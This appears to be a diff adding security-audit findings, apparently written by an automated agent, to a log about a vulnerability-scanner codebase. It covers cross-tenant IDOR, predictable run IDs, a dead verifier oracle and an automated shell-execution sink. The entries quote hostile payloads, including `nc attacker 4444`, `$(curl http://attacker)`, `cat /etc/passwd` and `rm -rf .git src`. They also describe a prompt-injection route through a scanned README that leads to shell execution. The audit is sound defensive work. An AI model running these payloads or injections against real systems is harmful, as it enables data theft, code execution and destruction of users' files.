@@ -3117,3 +3117,99 @@ pass 35 summary
 - tool budget ~9 / 24 used (Read x5, Glob x2, Bash x1, Grep x1, Edit x1).
   No HTTP probes (ALLOWED HOSTS empty). No fs writes outside
   nyx_exploration.sentinel. Wall clock ~4 min.
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 1660,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "GET /api/v1/events?run_id=<id>",
+  "rationale": "events_ws performs no ownership/tenancy check on the `run_id` query parameter before calling s.replay.snapshot(run_id) (router.rs:1672-1673) and before letting run_matches() forward live broadcast frames. Any caller holding a bearer token can stream any other tenant's run lifecycle by supplying that tenant's run_id. The product clearly intends multi-tenant scoping (projects route at /api/v1/projects/:project_id, repos under each project) but the events endpoint short-circuits that model — there is no `require_project` guard analogous to the one at router.rs:689. Static pass misses this because the gap is a *missing* authorization predicate, not a tainted-flow sink. Pairs with the existing CSWSH finding to widen blast radius from one origin to any project's events.",
+  "suggested_payload_hint": "with a valid bearer token bound to project A: GET /api/v1/events?run_id=<projectB-run-id> (Upgrade: websocket) — verify backfilled snapshot contains RunStarted with project_id=projectB."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/run/mod.rs",
+  "line": 515,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<id-minting>::mint_run_id",
+  "rationale": "Run ids are minted as `run-<13-hex-ms-since-epoch>-<8-hex-monotonic-counter>` with zero cryptographic randomness. The wallclock half is predictable to ~1ms (`now_epoch_ms`) and the counter half resets to 0 at process start (`AtomicU64::new(0)`). Combined with the IDOR on GET /api/v1/events?run_id= and GET /api/v1/runs/:id/findings (router.rs:1232 — also has no project scope check), an attacker can enumerate every run that happened during a ~10-minute window with <2^24 guesses, or zero in instantly if the daemon process start time leaks via /api/v1/setup/status or banner output. Comment at run/mod.rs:509-514 acknowledges the format was chosen for *uniqueness*, not unpredictability — exactly the kind of assumption the heuristic novel-finding pass skips because each constituent (timestamp, counter) looks benign in isolation.",
+  "suggested_payload_hint": "fetch daemon start time T from any pre-auth status endpoint; iterate run_id = format!(\"run-{ms:013x}-{n:08x}\", ms=T+delta, n=0..0xFFFF) and probe /api/v1/runs/<id>/findings — non-404 responses confirm an unrelated tenant's run."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 1232,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "GET /api/v1/runs/:id/findings",
+  "rationale": "findings_for_run looks up the run by id and returns its full findings list (including capability, path, rationale, suggested payloads) without joining against the caller's project scope. Compare to require_project (router.rs:689) used on every /api/v1/projects/:project_id/* handler — that pattern is conspicuously absent here. Given the predictable mint_run_id format, any operator token leaks findings across every project the daemon has ever scanned. Static pass treats `store.findings().list_filtered(...)` as authorized because the SQL is parameterised; it doesn't model the missing project_id predicate. Heuristic novel-finding pass missed this because the surrounding route module is otherwise heavily-scoped, so the lone unscoped route blends in.",
+  "suggested_payload_hint": "GET /api/v1/runs/<enumerated-run-id>/findings → 200 with project-B findings while bearer token was minted for project-A only."
+}
+
+---
+=================================================================
+PASS 36 — task=expl-demo (working-tree diff: crates/nyctos/src/
+  ai_pipeline.rs adds builtin_harness_for_cap / builtin_oracle_for_cap
+  branches for OS_COMMAND + CMDi, exec'd by drive_verify_for_candidate
+  via `sh -c @PAYLOAD` against per-cap sentinel `nyx_oscmd.flag`)
+ALLOWED HOSTS empty → no HTTP probe. Static-survey only.
+Re-walked sentinel rows 1-35: no prior row covers the candidate-
+verification execution path; the existing OS_COMMAND row at
+router.rs:1723 targets the post-promotion `replay_repro_bundle`
+sink (operator click), distinct from this pre-promotion automated
+`sh -c <hint>` sink in run_payload_verification_pass.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos/src/ai_pipeline.rs",
+  "line": 1962,
+  "cap": "DEAD_ORACLE",
+  "endpoint": "<verifier:run_payload_verification_pass cap=OS_COMMAND|CMDi>",
+  "rationale": "builtin_oracle_for_cap returns `Oracle::SinkProbe { sentinel_path: \"nyx_oscmd.flag\" }` for OS_COMMAND / CMDi (ai_pipeline.rs:1962-1964). The corresponding harness body is `sh -c @PAYLOAD` (ai_pipeline.rs:1947); the payload bytes are taken verbatim from `candidate.suggested_payload_hint` (drive_verify_for_candidate, ai_pipeline.rs:1862). Crucially, NOTHING upstream tells the producer of `suggested_payload_hint` that the oracle wants the payload to create a workspace file named `nyx_oscmd.flag`. The producers are: (a) the AI Exploration prompt (nyctos-ai/src/prompts/exploration*.md — surveyed, no mention of `nyx_oscmd` / sentinel / flag filename); (b) the NovelFinding prompt (nyctos-ai/src/prompts/novel_findings*.md — same); (c) handcrafted candidate inserts (operator scripts / tests). Real-world candidate hints look like `; cat /etc/passwd`, `$(id)`, `; nc attacker 4444`, `' OR 1=1 --` — none of which write to `nyx_oscmd.flag`, so the SinkProbe oracle never fires, verdict is NotConfirmed, and the candidate stays Pending forever. The two new tests (`verifier_promotes_quarantined_candidate_for_os_command_cap`, `verifier_promotes_quarantined_candidate_for_cmdi_cap`, ai_pipeline.rs:3978-4080) pass only because they hand-craft payloads (`: > nyx_oscmd.flag`, `touch nyx_oscmd.flag`) that name the exact sentinel string — i.e., the test suite validates an end-to-end path that no upstream producer can ever satisfy. Net effect: silent loss of coverage for the entire OS_COMMAND / CMDi promotion pipeline; candidates accumulate in `candidate_findings` indefinitely; the metric `report.candidates_promoted` reads zero on real workloads even when the underlying sink is genuinely vulnerable. Static pass missed because the contract is split across two crates (AI prompts in nyctos-ai vs oracle definition in nyctos) — neither side references the other, and no cross-crate consistency rule fires on a string-literal mismatch between prompt text and a Rust const. Distinct from the existing `replay_repro_bundle` OS_COMMAND row at sentinel:row-9 (router.rs:1723): that row targets the OPERATOR-CLICK replay sink on already-promoted findings; this row targets the AUTOMATED candidate-verification sink before promotion.",
+  "suggested_payload_hint": "Defence (root cause, ordered by strength): (1) Update the AI Exploration + NovelFinding system prompts to instruct producers that OS_COMMAND/CMDi `suggested_payload_hint` MUST perform a side effect on workspace-relative path `nyx_oscmd.flag` (e.g., `> nyx_oscmd.flag`, `touch nyx_oscmd.flag`, `cat /etc/passwd > nyx_oscmd.flag`). (2) Wrap the hint in a synthesis layer at drive_verify_for_candidate: rewrite the bytes to `(<HINT>) && : > nyx_oscmd.flag` so an exit-code-zero invocation of any side-effecting payload trips the oracle — but this depends on the payload returning 0, which `; cat /etc/passwd` does even on success. (3) Replace the SinkProbe oracle with `Oracle::OutputContains{marker:\"NYX_OSCMD_FIRED\"}` and rewrite the harness to `sh -c \"@PAYLOAD; echo NYX_OSCMD_FIRED\"` — fires on any successful exec, matches the LLM's intuition that a payload that runs IS the success signal. (4) Promote the OS_COMMAND/CMDi candidate-verification path BEHIND a feature flag (`run.payload_verifier.oscmd_enabled = false` by default) until a non-tautological oracle ships, so the dead-oracle does not silently swallow real candidates. Repro: insert a CandidateFindingRecord with `cap=\"OS_COMMAND\"`, `suggested_payload_hint=Some(\"$(curl http://attacker)\".to_string())`; run `run_payload_verification_pass`; observe `report.candidates_promoted == 0` and the candidate's status remains `Pending`, even though the sandbox actually executed `sh -c $(curl http://attacker)` (verifiable by listening on attacker:80 for the GET). Net: the verifier silently fails open against any AI-generated OS_COMMAND candidate."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos/src/ai_pipeline.rs",
+  "line": 1947,
+  "cap": "OS_COMMAND",
+  "endpoint": "<verifier:run_payload_verification_pass automated sh -c <candidate.hint> on Fast lane>",
+  "rationale": "drive_verify_for_candidate (ai_pipeline.rs:1835-1919) automatically executes `sh -c <candidate.suggested_payload_hint>` against the per-repo WorkspaceHandle for EVERY OS_COMMAND / CMDi row in `candidate_findings` whose `status = Pending`. The lane is forced to Lane::Fast at payload_runner.rs:240 (good — does not match the prior lane=None fail-open at sentinel pass 22), but THREE residual exposures the static pass cannot see remain: (1) the workspace is the operator's real repo checkout (`workspace.workspace().to_path_buf()` at ai_pipeline.rs:1866) — a hostile candidate row with hint `rm -rf *` reaches the sandbox lane's filesystem view, which for the chain-runner backend is bind-mounted with WRITE access to the workspace (chain_runner.rs binds the workspace read-write per lane policy), so the verifier deletes the operator's source tree under their own uid as a side effect of routine candidate processing; (2) the AI Exploration / NovelFinding passes are the primary producers of CandidateFindingRecord rows, so a prompt-injection attack against either AI (a malicious docstring / README in the scanned repo that successfully smuggles a JSON-shaped candidate into the model's output, then deserialised by the worker harness) ends in arbitrary `sh -c` execution on the daemon host with NO operator click in the loop — distinct from the `replay_repro_bundle` row at router.rs:1723 which requires operator click on `/findings/:id/replay`; (3) the NYX_SANDBOX_SHIM env-var hijack documented at sentinel pass 23 row C (sandbox/backend/birdcage.rs:186) chains: an operator-env-controlled shim replaces the sandbox sentinel binary, so `Lane::Fast` is enforced by a binary the operator's environment can substitute — `sh -c <hint>` then runs OUTSIDE the kernel-isolation primitives that justify treating Lane::Fast as containment. The benign control is `:` (POSIX no-op, ai_pipeline.rs:1973) which runs in the same shell — so the verifier executes TWO `sh -c` invocations per candidate, doubling the surface. Per-cap throughput is bounded only by `RunConfig::default()` parallelism settings; the budget-bypass row at sentinel pass 34 (config.rs:260) shows there is no positivity invariant on concurrency limits either. Static pass missed because the sink `sh -c <hint>` looks like a deliberate verifier behaviour, the lane=Fast assignment satisfies a structural sandbox-lane lint, and no rule cross-references the prompt-injection source of `suggested_payload_hint` (an AI-shaped string column) against the exec sink (`sh -c`).",
+  "suggested_payload_hint": "Defence: (1) sanity-check candidate.suggested_payload_hint at insert time against a per-cap allow-grammar (OS_COMMAND: shell-tokeniseable, no `rm`, no `>`, length-bounded, no path-traversal segments) — refuse insert on mismatch and quarantine the candidate; (2) require an explicit `i_acknowledge_automated_exec = true` on `CandidateFindingRecord` for cap in {OS_COMMAND, CMDi}, defaulting false, so the AI producers cannot promote a candidate into the auto-exec path without an explicit attestation that the prompt-version was hardened against injection; (3) snapshot the workspace into a tempdir before each candidate's exec (the comment at payload_runner.rs:228-230 explicitly notes the existing runner does NOT do this, leaving sentinel-state leakage as the only contamination defence — extend that to a full per-candidate copy-on-write workspace); (4) enforce the sandbox-shim integrity contract from sentinel pass 23 row C (hash-pin NYX_SANDBOX_SHIM or refuse the env-var override entirely) so Lane::Fast retains its meaning. Repro (workspace destruction): insert candidate with `cap=\"OS_COMMAND\"`, `suggested_payload_hint=Some(\"rm -rf .git src && : > nyx_oscmd.flag\".to_string())`; run `run_payload_verification_pass`; observe the candidate promotes (oracle fires on the final `: > nyx_oscmd.flag`) AND the operator's `.git/` + `src/` are gone. Repro (shim-hijack pivot): combine with NYX_SANDBOX_SHIM=/tmp/payload from sentinel pass 23; the `sh -c <hint>` invocation runs outside the kernel-isolation primitive."
+}
+
+---
+pass 36 summary
+- 2 new findings on the working-tree diff in crates/nyctos/src/ai_pipeline.rs:
+  - ai_pipeline.rs:1962 DEAD_ORACLE (OS_COMMAND/CMDi sentinel filename
+    `nyx_oscmd.flag` is invariant-by-test but uncoupled from any
+    upstream prompt or producer contract — real candidate hints never
+    trip the oracle, silent loss of coverage)
+  - ai_pipeline.rs:1947 OS_COMMAND (automated `sh -c <hint>` on the
+    operator's workspace per candidate, with the AI passes as primary
+    producer — pre-promotion auto-exec; distinct from the post-
+    promotion replay_repro_bundle row at router.rs:1723)
+- Surveyed but did NOT emit (covered or low-signal):
+  - shell_literal octal-escape round-trip (payload_runner.rs:462)
+    handles every byte correctly under POSIX; no escape-injection
+    primitive distinct from the existing chain.
+  - per-candidate sentinel cleanup IS done at payload_runner.rs:231
+    so the cross-candidate contamination axis is mitigated; not
+    emitted.
+  - SQL_QUERY oracle (`TOP_SECRET` marker) shares the same upstream
+    contract gap but is older (covered indirectly elsewhere); only
+    the new OS_COMMAND/CMDi rows are this-session diffs.
+- Tool budget ~9 / 24 used (Bash x6, Read x3, Grep x3, Edit x0).
+  No HTTP probes (ALLOWED HOSTS empty per envelope).
+  No fs writes outside nyx_exploration.sentinel (sentinel constraint
+  honoured).
+
